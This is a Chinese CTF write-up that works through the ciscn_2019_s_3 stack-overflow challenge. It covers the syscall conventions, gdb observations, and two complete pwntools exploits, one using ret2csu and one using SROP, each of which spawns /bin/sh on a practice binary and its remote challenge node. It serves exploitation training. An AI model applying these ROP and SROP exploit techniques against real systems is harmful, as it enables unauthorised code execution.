原创 紫色仰望 合天智汇

## 0x01  

我在动态调试这个程序的时候，发现 syscall调用 系统函数 的过程很有趣，于是便记录下来 希望对大家 能带来些帮助，这里 以 buu 平台上的
ciscn_2019_s_3 为例，给大家详细地分享以及分析下！

## 0x02  

在开始之前，我们先来认真 学习下 read()，write()的 原型：

read()： ssize_t read(int fd,const void *buf,size_t nbytes); //fd 为要读取的文件的描述符 0
//buf 为要读取的数据的缓冲区地址 //nbytes 为要读取的数据的字节数 //read() 函数会从 fd 文件中读取 nbytes
个字节并保存到缓冲区 buf， //成功则返回读取到的字节数（但遇到文件结尾则返回0），失败则返回 -1。 write() ssize_t
write(int fd,const void *buf,size_t nbytes); //fd 为要写入的文件的描述符 1 //buf
为要写入的数据的缓冲区地址 //nbytes 为要写入的数据的字节数 //write() 函数会将缓冲区 buf 中的 nbytes 个字节写入文件 fd，
//成功则返回写入的字节数，失败则返回 -1。

## 0x03  

然后我们再来简单了解下 syscall ！嗯...我们来看下****的介绍吧，

![v2-7cc8245c7af7881aff190043818643fb_hd.j](https://pic3.zhimg.com/80/v2-7cc8245c7af7881aff190043818643fb_hd.jpg)

上面的是 32 位的系统调用，而64位系统的系统调用总体思想还是一样的，当然也会有些不同，

32位与64位 系统调用的区别：

1\. 传参方式不同

2\. 系统调用号 不同

3\. 调用方式 不同

32位：

传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器

调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4

调用方式: 使用 int 80h 中断进行系统调用

64位：

传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器

调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1

stub_execve 的调用号 为 59 stub_rt_sigreturn 的调用号 为 15

调用方式: 使用 syscall 进行系统调用

Ok，知道了上面这些知识，那么做这题，其实相对来说 会容易些了！可能本来大佬们就没觉得难，还求勿喷！基于网上
对这题的题解很少，我调试了很长时间才弄懂！实在是太弱了！

点击“[课程:ARM汇编教程(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=CCIDc0ec-6fda-4403-bd39-82c0f3a70c9b)”开始实操练习!

## 0x04  

首先检查文件属性和文件开启的保护有哪些：

$file ciscn_s_3ciscn_s_3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32,
BuildID[sha1]=af580816080db5e4d1d93a271087adaee29028e8, not stripped checksec
ciscn_s_3 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found
NX: NX enabled PIE: No PIE (0x400000)

64位elf 文件 只开启 NX 保护

拖入ida 查看main函数：

int __cdecl main(int argc, const char **argv, const char **envp) { return
vuln(); } 进去 vuln()函数： signed __int64 vuln() { signed __int64 result; // rax
__asm { syscall; LINUX - sys_read } result = 1LL; __asm { syscall; LINUX -sys_write } return result; }

嗯。。。我们看汇编代码！

![v2-5bf913056d106e2e5063765c6adf7368_hd.j](https://pic3.zhimg.com/80/v2-5bf913056d106e2e5063765c6adf7368_hd.jpg)

这里可以看到 汇编指令 的含义

\-----------------------------------------------------
将read的系统调用号 0 赋值给 rax

将 read的第一个参数0 （fd） 赋值给了 rdi

将 read的第二个参数 buf 赋值给了 rsi

将 read的第二个参数 buf 赋值给了 rdx

即系统调用了 read(0,&buf,0x400)

同理 紧接着 又调用了 write(1,&buf,0x30)

其中 buf 距离 rbp 0x10个字节，存在栈溢出漏洞！

![v2-386fdcd8fa47f1c3daddaa2f17a21a59_hd.j](https://pic4.zhimg.com/80/v2-386fdcd8fa47f1c3daddaa2f17a21a59_hd.jpg)

然后经过调试 我还发现当执行了 syscall这个汇编命令(即调用对应系统函数)后，

在gdb上可以很清楚的 看到 其实执行完后 对寄存器的影响

仅仅发生改变的是RAX，与RCX

其中 RAX 会存着 对应系统函数 调用后返回的结果

RCX 会存着当 syscall指令的下一条指令地址

这里放个对比图，可以看的更明白些！

syscall指令 执行前：

![v2-edbb590337d19e75b7e631331c52ce2c_hd.j](https://pic3.zhimg.com/80/v2-edbb590337d19e75b7e631331c52ce2c_hd.jpg)

syscall指令执行后：

![v2-da65cbd62c7710ff514127f3a1176970_hd.j](https://pic1.zhimg.com/80/v2-da65cbd62c7710ff514127f3a1176970_hd.jpg)

当然，知道这些对于我们来说已经足够了！

我们继续来分析下 vuln函数 ，具体看下图中注释

![v2-740d4d7f30d6694256651bd70fde51c8_hd.j](https://pic4.zhimg.com/80/v2-740d4d7f30d6694256651bd70fde51c8_hd.jpg)

这个题rsp和rbp一直在重合，直接ret,就相当于pop rip，

所以覆盖rbp就可以劫持了程序执行流。

所以 这题 在最后 ret的 时候其实 就是 返回 到了rbp处 的地址了。这点很重要。

\-----------------------------------------------
另外程序中还有个gadgets 函数

![v2-d0f79b76ba17900f997bb7434f8428e4_hd.j](https://pic3.zhimg.com/80/v2-d0f79b76ba17900f997bb7434f8428e4_hd.jpg)

我们可以 发现这个函数里面有两个可以 gadget 即 控制 rax的 带有 ret 的汇编指令片段

mov rax，0Fh // 0Fh 即15 而15 对应的是 sys_rt_sigreturn系统调用 mov rax，3Bh // 3Bh 即 59
而15 对应的是 sys_execve 系统调用

对于 以上两个系统调用，我们可以有两种 解题方法

第一种：利用 ret2__libc_csu_init 去构造 execve("/bin/sh",0,0) 来 getshell 第二种：直接srop 伪造
sigreturn frame 去 构造 execve("/bin/sh",0,0) 来 getshell

我们重点 就看第一种 了：

因为是系统调用嘛，

所以我们要想 构造 execve("/bin/sh",0,0) 需要

将 sys_execve 的调用号 59 赋值给 rax 将 第一个参数即字符串 "/bin/sh"的地址 赋值给 rdi 将 第二个参数 0 赋值给
rsi 将 第三个参数 0 赋值给 rdx

但我们发现 我们没有 足够gadget 可以利用，于是我们想到了

“x64 下的 __libc_csu_init 中的 gadgets，这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc
函数，所以这个函数一定会存在“

用下面这个命令去 找到它的位置，

ROPgadget --binary ciscn_s_3 --only 'pop|ret'

![v2-ead5a9954214dd952eaaf4d40ed597b3_hd.j](https://pic4.zhimg.com/80/v2-ead5a9954214dd952eaaf4d40ed597b3_hd.jpg)

这里需要注意 Ropgadget 有时总会 有一点显示的不完整，我们通过它在ida中再去看下，

loc_400580和loc_400596 就是上面说的 __libc_csu_init gadget了。

![v2-ea12fef5ad4335e97cec0c97374dbd51_hd.j](https://pic2.zhimg.com/80/v2-ea12fef5ad4335e97cec0c97374dbd51_hd.jpg)

## 0x05  

我们最终写下如下 exp：

#coding:utf8 from pwn import * context.log_level = 'debug'
conn=process("./ciscn_s_3")vuln_addr=0x4004ED mov_rax_execv_addr=0x4004E2
#ida中查看 pop_rdi_ret_addr=0x4005a3 #ROPgadget --binary ciscn_s_3 --only
'pop|ret' pop_rbx_rbp_r12_r13_r14_r15_ret_addr=0x40059A
__libc_csu_init_addr=0x400580 # __libc_csu_init gadget 首地址
syscall_addr=0x400501 #ida中查看 #gdb.attach(conn,'b *0x40052C')
payload1='/bin/sh\x00'*2+p64(vuln_addr) conn.send(payload1)
conn.recv(0x20)bin_sh_addr=u64(conn.recv(8))-280print hex(bin_sh_addr) #解答
1payload2='/bin/sh\x00'*2+p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)+p64(0)*2+p64(bin_sh_addr+0x50)+p64(0)*3payload2+=p64(__libc_csu_init_addr)+p64(mov_rax_execv_addr)payload2+=p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(syscall_addr)
#解答 2conn.send(payload2)conn.interactive()

## 0x06  

我们照着 exp 来分析下 ：

解答1：

因为最后我们构造payload的时候需要用到 /bin/sh 的地址，程序中又没有，我们这里选择自己输入，但是我们输入到了 栈上，为了后面可以使用该
地址，我们需要首先将 /bin/sh 所在栈地址 泄露出来！

我们gdb调试，可以得知 在write输出的 0x20字节后 的 0x00007fffffffde08 是栈 上的地址 我们用它 减去 buf 所在栈上地址
即可得到 /bin/sh所在栈上地址 0x00007fffffffde08-0x7fffffffdcf0=280

反之 bin_sh_addr=0x00007fffffffde08-280

![v2-db5556fafe35f968081d98d9feaef833_hd.j](https://pic2.zhimg.com/80/v2-db5556fafe35f968081d98d9feaef833_hd.jpg)

解答二 ：

为什么要这样构造 payload2？

payload2='/bin/sh\x00'*2+p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)+p64(0)*2+p64(bin_sh_addr+0x50)+p64(0)*3
payload2+=p64(__libc_csu_init_addr)+p64(mov_rax_execv_addr)
payload2+=p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(syscall_addr)

看这个payload的第一行：

因为文章上面我已经分析过了

******************************************************************************************

这个题rsp和rbp一直在重合，直接ret,就相当于pop rip，

所以覆盖rbp就可以劫持了程序执行流。

所以 这题 在最后 ret的 时候其实 就是 返回 到了rbp处 的地址了。于是
p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr) 其实就相当于是在ret_addr处，

**************************************************************************

![v2-e96fe5fd8bb1588dc365fa4ae488c67e_hd.j](https://pic3.zhimg.com/80/v2-e96fe5fd8bb1588dc365fa4ae488c67e_hd.jpg)

看图，动态来具体了解下 这个payload是怎么运转的我们跟进去

![v2-4d146f15191eef57b5afa5053782b7e5_hd.j](https://pic4.zhimg.com/80/v2-4d146f15191eef57b5afa5053782b7e5_hd.jpg)

继续 n 我们会返回到 __libc_csu_init_addr 0x400580

![v2-08ab5c41c5ecc0d3ab36a5accfc8efcc_hd.j](https://pic2.zhimg.com/80/v2-08ab5c41c5ecc0d3ab36a5accfc8efcc_hd.jpg)

如图：将execve 的系统调用号 0x 3b 赋值给 rax

![v2-10043bbba153b084ba6e63add91b0b55_hd.j](https://pic2.zhimg.com/80/v2-10043bbba153b084ba6e63add91b0b55_hd.jpg)

执行完后会 ret 回到 add rbx，0x1

这里是很关键的一步，

原本 rbp=rbx=0，然而 rbx在这 加了 1 与 rbp就不再相等 于是 会跳转到0x400580执行

![v2-fc33b00c96e1473a412e8cb2bbc0cb81_hd.j](https://pic1.zhimg.com/80/v2-fc33b00c96e1473a412e8cb2bbc0cb81_hd.jpg)

call QWORD PTR [r12+rbx*8] 便会 调用了 红框之后的 pop_rdi_ret_addr 处的函gadget了

![v2-97afa8fc8726cc032aecd638289e3292_hd.j](https://pic2.zhimg.com/80/v2-97afa8fc8726cc032aecd638289e3292_hd.jpg)

然后接着就是 把 bin_sh_addr 赋值给了 rdi了

这样 execve("/bin/sh",0,0)就构造成功了，最后再执行syscall_addr便成功调用该函数 于是getshell 。

![v2-c03b1e95ff0c512b34931edfb3ea1082_hd.j](https://pic3.zhimg.com/80/v2-c03b1e95ff0c512b34931edfb3ea1082_hd.jpg)

这里如果 还理解不了的话 可以在ctf_wiki学习下栈溢出之 medium_rop

<https://wiki.x10sec.org/pwn/stackoverflow/medium_rop/>

## 0x07  

第二种：直接srop 伪造 sigreturn frame 去 伪造 execve("/bin/sh",0,0) 来 getshell

具体就是 首先利用 mov rax, 0Fh 控制rax为 15，然后 调用 syscall 即执行了 sigreturn，我们 伪造 sigreturn
frame 去 执行 execve("/bin/sh",0,0) 即可

#coding:utf8 from pwn import * context(arch='amd64', os='linux', log_level =
'DEBUG')#这个注意 一定要说明 内核架构 不然报错 #context.log_level = 'debug'
conn=process("./ciscn_s_3") conn=remote('node3.buuoj.cn',26536)
vuln_addr=0x4004ED mov_rax_sigreturn_addr=0x4004DA syscall_addr=0x400501
#gdb.attach(conn,'b *0x40052C') payload1='/bin/sh\x00'*2+p64(vuln_addr)
conn.send(payload1) conn.recv(0x20) bin_sh_addr=u64(conn.recv(8))-280 print
hex(bin_sh_addr) frame = SigreturnFrame() frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr frame.rsi = 0 frame.rdx = 0 #frame.rsp = bin_sh_addr
frame.rip = syscall_addr
payload2='/bin/sh\x00'*2+p64(mov_rax_sigreturn_addr)+p64(syscall_addr)+str(frame)
conn.send(payload2) conn.interactive()

最后要注意的一点就是 写 exp 时一定要 说明 内核架构 不然报错！

context(arch='amd64', os='linux', log_level = 'DEBUG')#这个注意一定要说明内核架构 ，不然报错。

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

